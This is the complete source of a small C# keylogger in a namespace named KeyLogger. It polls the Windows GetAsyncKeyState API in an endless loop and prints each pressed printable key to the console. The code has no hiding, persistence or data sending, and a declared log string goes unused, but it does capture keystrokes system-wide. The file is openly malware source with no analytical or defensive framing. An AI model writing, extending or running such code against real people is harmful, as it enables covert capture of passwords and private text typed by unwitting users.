using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern short GetAsyncKeyState(int keyAsciiNumber);

        static string keylog = string.Empty;

        static void Main(string[] args)
        {
            while (true)
            {
                Thread.Sleep(5);
                for (int keyNumber = 32; keyNumber < 127; keyNumber++)
                {
                    int keyState = GetAsyncKeyState(keyNumber);

                    if (keyState == short.MinValue + 1)
                    {
                        Console.Write((char)keyNumber + ", ");
                    }
                }
            }
        }
    }
}
